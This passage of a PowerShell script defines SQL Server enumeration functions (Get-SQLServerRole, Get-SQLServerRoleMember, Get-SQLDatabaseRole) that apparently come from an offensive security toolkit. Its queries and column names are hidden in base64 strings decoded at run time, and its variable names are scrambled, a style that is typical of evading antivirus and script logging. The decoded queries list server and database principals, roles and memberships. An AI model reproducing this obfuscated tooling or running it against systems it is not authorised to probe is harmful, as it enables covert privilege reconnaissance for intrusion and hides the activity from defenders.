                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARwByAGEAYgBiAGkAbgBnACAAZABhAHQAYQBiAGEAcwBlACAAdQBzAGUAcgBzACAAZgByAG8AbQAgACQAewAvAD0APQA9AD0AXAAvAD0AXABfAC8APQA9AFwAXwBfAC8AfQAuAA==')))
            }
            $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAFUAUwBFACAAJAB7AC8APQA9AD0APQBcAC8APQBcAF8ALwA9AD0AXABfAF8ALwB9ADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUwBFAEwARQBDAFQAIAAgACcAJABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAnACAAYQBzACAAWwBDAG8AbQBwAHUAdABlAHIATgBhAG0AZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJwAkAEkAbgBzAHQAYQBuAGMAZQAnACAAYQBzACAAWwBJAG4AcwB0AGEAbgBjAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACcAJAB7AC8APQA9AD0APQBcAC8APQBcAF8ALwA9AD0AXABfAF8ALwB9ACcAIABhAHMAIABbAEQAYQB0AGEAYgBhAHMAZQBOAGEAbQBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABhAC4AcAByAGkAbgBjAGkAcABhAGwAXwBpAGQAIABhAHMAIABbAEQAYQB0AGEAYgBhAHMAZQBVAHMAZQByAEkAZABdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYQAuAG4AYQBtAGUAIABhAHMAIABbAEQAYQB0AGEAYgBhAHMAZQBVAHMAZQByAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABhAC4AcwBpAGQAIABhAHMAIABbAFAAcgBpAG4AYwBpAHAAYQBsAFMAaQBkAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABiAC4AbgBhAG0AZQAgAGEAcwAgAFsAUAByAGkAbgBjAGkAcABhAGwATgBhAG0AZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYQAuAHQAeQBwAGUAXwBkAGUAcwBjACAAYQBzACAAWwBQAHIAaQBuAGMAaQBwAGEAbABUAHkAcABlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABkAGUAZgBhAHUAbAB0AF8AcwBjAGgAZQBtAGEAXwBuAGEAbQBlACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYQAuAGMAcgBlAGEAdABlAF8AZABhAHQAZQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGEALgBpAHMAXwBmAGkAeABlAGQAXwByAG8AbABlAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEYAUgBPAE0AIAAgACAAIABbAHMAeQBzAF0ALgBbAGQAYQB0AGEAYgBhAHMAZQBfAHAAcgBpAG4AYwBpAHAAYQBsAHMAXQAgAGEADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAATABFAEYAVAAgAEoATwBJAE4AIABbAHMAeQBzAF0ALgBbAHMAZQByAHYAZQByAF8AcAByAGkAbgBjAGkAcABhAGwAcwBdACAAYgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABPAE4AIABhAC4AcwBpAGQAIAA9ACAAYgAuAHMAaQBkACAAVwBIAEUAUgBFACAAMQA9ADEADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAB7AF8ALwBcAC8AXAAvAFwAXwAvAFwALwBcAF8ALwBcAC8AXAB9AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHsAXwBfAC8APQBcAC8AXAAvAD0APQA9AFwAXwBfAC8AXAAvAH0A')))
            ${______/=\/==\_/==} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            ${______/=\/==\_/==} |
            % -Process {
                if($_.PrincipalSid.GetType() -eq [System.DBNull])
                {
                    ${_/\/\/=\_/=\/\__/} = ''
                }
                else
                {
                    ${/=\/======\___/=\} = [System.BitConverter]::ToString($_.PrincipalSid).Replace('-','')
                    if (${/=\/======\___/=\}.length -le 10)
                    {
                        ${_/\/\/=\_/=\/\__/} = [Convert]::ToInt32(${/=\/======\___/=\},16)
                    }
                    else
                    {
                        ${_/\/\/=\_/=\/\__/} = ${/=\/======\___/=\}
                    }
                }
                $null = ${_/\/\/==\/\_/\/\/}.Rows.Add(
                    [string]$_.ComputerName,
                    [string]$_.Instance,
                    [string]$_.DatabaseName,
                    [string]$_.DatabaseUserId,
                    [string]$_.DatabaseUser,
                    ${_/\/\/=\_/=\/\__/},
                    [string]$_.PrincipalName,
                    [string]$_.PrincipalType,
                    [string]$_.default_schema_name,
                    [string]$_.create_date,
                [string]$_.is_fixed_role)
            }
        }
    }
    End
    {
        ${_/\/\/==\/\_/\/\/}
    }
}
Function  Get-SQLServerRole
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Role name.')]
        [string]$RolePrincipalName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = "Role owner's name.")]
        [string]$RoleOwner,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${___/==\______/=\_} = New-Object -TypeName System.Data.DataTable
        $null = ${___/==\______/=\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${___/==\______/=\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${___/==\______/=\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAGwAZQBQAHIAaQBuAGMAaQBwAGEAbABJAGQA'))))
        $null = ${___/==\______/=\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAGwAZQBQAHIAaQBuAGMAaQBwAGEAbABTAGkAZAA='))))
        $null = ${___/==\______/=\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAGwAZQBQAHIAaQBuAGMAaQBwAGEAbABOAGEAbQBlAA=='))))
        $null = ${___/==\______/=\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAGwAZQBQAHIAaQBuAGMAaQBwAGEAbABUAHkAcABlAA=='))))
        $null = ${___/==\______/=\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByAFAAcgBpAG4AYwBpAHAAYQBsAEkAZAA='))))
        $null = ${___/==\______/=\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByAFAAcgBpAG4AYwBpAHAAYQBsAE4AYQBtAGUA'))))
        $null = ${___/==\______/=\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAF8AZABpAHMAYQBiAGwAZQBkAA=='))))
        $null = ${___/==\______/=\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAF8AZgBpAHgAZQBkAF8AcgBvAGwAZQA='))))
        $null = ${___/==\______/=\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwByAGUAYQB0AGUAXwBkAGEAdABlAA=='))))
        $null = ${___/==\______/=\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBvAGQAaQBmAHkAXwBEAGEAdABlAA=='))))
        $null = ${___/==\______/=\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABlAGYAYQB1AGwAdABfAGQAYQB0AGEAYgBhAHMAZQBfAG4AYQBtAGUA'))))
        if ($RoleOwner)
        {
            ${/=\/\/\/==\/===\/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABBAE4ARAAgAHMAdQBzAGUAcgBfAG4AYQBtAGUAKABvAHcAbgBpAG4AZwBfAHAAcgBpAG4AYwBpAHAAYQBsAF8AaQBkACkAIABsAGkAawBlACAAJwAkAFIAbwBsAGUATwB3AG4AZQByACcA')))
        }
        else
        {
            ${/=\/\/\/==\/===\/} = ''
        }
        if ($RolePrincipalName)
        {
            ${__/=\/\/===\__/\/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABBAE4ARAAgAG4AYQBtAGUAIABsAGkAawBlACAAJwAkAFIAbwBsAGUAUAByAGkAbgBjAGkAcABhAGwATgBhAG0AZQAnAA==')))
        }
        else
        {
            ${__/=\/\/===\__/\/} = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }
        $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAEwARQBDAFQAIAAgACAAJwAkAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlACcAIABhAHMAIABbAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJwAkAEkAbgBzAHQAYQBuAGMAZQAnACAAYQBzACAAWwBJAG4AcwB0AGEAbgBjAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAHIAaQBuAGMAaQBwAGEAbABfAGkAZAAgAGEAcwAgAFsAUgBvAGwAZQBQAHIAaQBuAGMAaQBwAGEAbABJAGQAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABzAGkAZAAgAGEAcwAgAFsAUgBvAGwAZQBQAHIAaQBuAGMAaQBwAGEAbABTAGkAZABdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAG4AYQBtAGUAIABhAHMAIABbAFIAbwBsAGUAUAByAGkAbgBjAGkAcABhAGwATgBhAG0AZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAeQBwAGUAXwBkAGUAcwBjACAAYQBzACAAWwBSAG8AbABlAFAAcgBpAG4AYwBpAHAAYQBsAFQAeQBwAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABvAHcAbgBpAG4AZwBfAHAAcgBpAG4AYwBpAHAAYQBsAF8AaQBkACAAYQBzACAAWwBPAHcAbgBlAHIAUAByAGkAbgBjAGkAcABhAGwASQBkAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcwB1AHMAZQByAF8AbgBhAG0AZQAoAG8AdwBuAGkAbgBnAF8AcAByAGkAbgBjAGkAcABhAGwAXwBpAGQAKQAgAGEAcwAgAFsATwB3AG4AZQByAFAAcgBpAG4AYwBpAHAAYQBsAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABpAHMAXwBkAGkAcwBhAGIAbABlAGQALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBzAF8AZgBpAHgAZQBkAF8AcgBvAGwAZQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABjAHIAZQBhAHQAZQBfAGQAYQB0AGUALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbQBvAGQAaQBmAHkAXwBEAGEAdABlACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGQAZQBmAGEAdQBsAHQAXwBkAGEAdABhAGIAYQBzAGUAXwBuAGEAbQBlAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABGAFIATwBNACAAWwBtAGEAcwB0AGUAcgBdAC4AWwBzAHkAcwBdAC4AWwBzAGUAcgB2AGUAcgBfAHAAcgBpAG4AYwBpAHAAYQBsAHMAXQAgAFcASABFAFIARQAgAHQAeQBwAGUAIABsAGkAawBlACAAJwBSACcADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAewBfAF8ALwA9AFwALwBcAC8APQA9AD0AXABfAF8ALwBcAC8AfQANAAoAIAAgACAAIAAgACAAIAAgACQAewAvAD0AXAAvAFwALwBcAC8APQA9AFwALwA9AD0APQBcAC8AfQA=')))
        ${/=\/=\_/==\_/====} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        ${/=\/=\_/==\_/====} |
        % -Process {
            ${/=\/======\___/=\} = [System.BitConverter]::ToString($_.RolePrincipalSid).Replace('-','')
            if (${/=\/======\___/=\}.length -le 10)
            {
                ${_/\/\/=\_/=\/\__/} = [Convert]::ToInt32(${/=\/======\___/=\},16)
            }
            else
            {
                ${_/\/\/=\_/=\/\__/} = ${/=\/======\___/=\}
            }
            $null = ${___/==\______/=\_}.Rows.Add(
                [string]$_.ComputerName,
                [string]$_.Instance,
                [string]$_.RolePrincipalId,
                ${_/\/\/=\_/=\/\__/},
                $_.RolePrincipalName,
                [string]$_.RolePrincipalType,
                [string]$_.OwnerPrincipalId,
                [string]$_.OwnerPrincipalName,
                [string]$_.is_disabled,
                [string]$_.is_fixed_role,
                $_.create_date,
                $_.modify_Date,
            [string]$_.default_database_name)
        }
    }
    End
    {
        ${___/==\______/=\_}
    }
}
Function  Get-SQLServerRoleMember
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Role name.')]
        [string]$RolePrincipalName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL login or Windows account name.')]
        [string]$PrincipalName,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${/\____/=\/\___/\_} = New-Object -TypeName System.Data.DataTable
        if ($RolePrincipalName)
        {
            ${/=\/\/\/==\/===\/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABBAE4ARAAgAFMAVQBTAEUAUgBfAE4AQQBNAEUAKAByAG8AbABlAF8AcAByAGkAbgBjAGkAcABhAGwAXwBpAGQAKQAgAGwAaQBrAGUAIAAnACQAUgBvAGwAZQBQAHIAaQBuAGMAaQBwAGEAbABOAGEAbQBlACcA')))
        }
        else
        {
            ${/=\/\/\/==\/===\/} = ''
        }
        if ($PrincipalName)
        {
            ${__/=\/\/===\__/\/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABBAE4ARAAgAFMAVQBTAEUAUgBfAE4AQQBNAEUAKABtAGUAbQBiAGUAcgBfAHAAcgBpAG4AYwBpAHAAYQBsAF8AaQBkACkAIABsAGkAawBlACAAJwAkAFAAcgBpAG4AYwBpAHAAYQBsAE4AYQBtAGUAJwA=')))
        }
        else
        {
            ${__/=\/\/===\__/\/} = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }
        $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAFMARQBMAEUAQwBUACAAIAAnACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAJwAgAGEAcwAgAFsAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAnACQASQBuAHMAdABhAG4AYwBlACcAIABhAHMAIABbAEkAbgBzAHQAYQBuAGMAZQBdACwAcgBvAGwAZQBfAHAAcgBpAG4AYwBpAHAAYQBsAF8AaQBkACAAYQBzACAAWwBSAG8AbABlAFAAcgBpAG4AYwBpAHAAYQBsAEkAZABdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFMAVQBTAEUAUgBfAE4AQQBNAEUAKAByAG8AbABlAF8AcAByAGkAbgBjAGkAcABhAGwAXwBpAGQAKQAgAGEAcwAgAFsAUgBvAGwAZQBQAHIAaQBuAGMAaQBwAGEAbABOAGEAbQBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbQBlAG0AYgBlAHIAXwBwAHIAaQBuAGMAaQBwAGEAbABfAGkAZAAgAGEAcwAgAFsAUAByAGkAbgBjAGkAcABhAGwASQBkAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUwBVAFMARQBSAF8ATgBBAE0ARQAoAG0AZQBtAGIAZQByAF8AcAByAGkAbgBjAGkAcABhAGwAXwBpAGQAKQAgAGEAcwAgAFsAUAByAGkAbgBjAGkAcABhAGwATgBhAG0AZQBdAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABGAFIATwBNACAAcwB5AHMALgBzAGUAcgB2AGUAcgBfAHIAbwBsAGUAXwBtAGUAbQBiAGUAcgBzACAAVwBIAEUAUgBFACAAMQA9ADEADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAewBfAF8ALwA9AFwALwBcAC8APQA9AD0AXABfAF8ALwBcAC8AfQANAAoAIAAgACAAIAAgACAAIAAgACQAewAvAD0AXAAvAFwALwBcAC8APQA9AFwALwA9AD0APQBcAC8AfQA=')))
        ${_/=\__/=\/\/\_/\_} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        ${/\____/=\/\___/\_} = ${/\____/=\/\___/\_} + ${_/=\__/=\/\/\_/\_}
    }
    End
    {
        ${/\____/=\/\___/\_}
    }
}
Function  Get-SQLDatabaseRole
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Role name.')]
        [string]$RolePrincipalName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = "Role owner's name.")]
        [string]$RoleOwner,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select non default databases.')]
        [switch]$NoDefaults,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${_/\/\/=\___/\__/=} = New-Object -TypeName System.Data.DataTable
        $null = ${_/\/\/=\___/\__/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${_/\/\/=\___/\__/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${_/\/\/=\___/\__/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAE4AYQBtAGUA'))))
        $null = ${_/\/\/=\___/\__/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAGwAZQBQAHIAaQBuAGMAaQBwAGEAbABJAGQA'))))
        $null = ${_/\/\/=\___/\__/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAGwAZQBQAHIAaQBuAGMAaQBwAGEAbABTAGkAZAA='))))
        $null = ${_/\/\/=\___/\__/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAGwAZQBQAHIAaQBuAGMAaQBwAGEAbABOAGEAbQBlAA=='))))
        $null = ${_/\/\/=\___/\__/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAGwAZQBQAHIAaQBuAGMAaQBwAGEAbABUAHkAcABlAA=='))))
        $null = ${_/\/\/=\___/\__/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByAFAAcgBpAG4AYwBpAHAAYQBsAEkAZAA='))))
        $null = ${_/\/\/=\___/\__/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByAFAAcgBpAG4AYwBpAHAAYQBsAE4AYQBtAGUA'))))
        $null = ${_/\/\/=\___/\__/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAF8AZgBpAHgAZQBkAF8AcgBvAGwAZQA='))))
        $null = ${_/\/\/=\___/\__/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwByAGUAYQB0AGUAXwBkAGEAdABlAA=='))))
        $null = ${_/\/\/=\___/\__/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBvAGQAaQBmAHkAXwBEAGEAdABlAA=='))))
        $null = ${_/\/\/=\___/\__/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABlAGYAYQB1AGwAdABfAHMAYwBoAGUAbQBhAF8AbgBhAG0AZQA='))))
        if ($RoleOwner)
        {
            ${/=\/\/\/==\/===\/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABBAE4ARAAgAHMAdQBzAGUAcgBfAG4AYQBtAGUAKABvAHcAbgBpAG4AZwBfAHAAcgBpAG4AYwBpAHAAYQBsAF8AaQBkACkAIABsAGkAawBlACAAJwAkAFIAbwBsAGUATwB3AG4AZQByACcA')))
        }
        else
        {
            ${/=\/\/\/==\/===\/} = ''
        }
        if ($RolePrincipalName)
        {
            ${__/\__/====\__/==} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABBAE4ARAAgAG4AYQBtAGUAIABsAGkAawBlACAAJwAkAFIAbwBsAGUAUAByAGkAbgBjAGkAcABhAGwATgBhAG0AZQAnAA==')))
        }
        else
        {
            ${__/\__/====\__/==} = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }
        if($NoDefaults)
        {
            ${/=\_____/\__/=\/\} = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose -NoDefaults
        }
        else
        {
            ${/=\_____/\__/=\/\} = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose
        }
        ${/=\_____/\__/=\/\} |
        % -Process {
            ${/====\/=\_/==\__/} = $_.DatabaseName
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARwBlAHQAdABpAG4AZwAgAHIAbwBsAGUAcwAgAGYAcgBvAG0AIAB0AGgAZQAgACQAewAvAD0APQA9AD0AXAAvAD0AXABfAC8APQA9AFwAXwBfAC8AfQAgAGQAYQB0AGEAYgBhAHMAZQAuAA==')))
            }
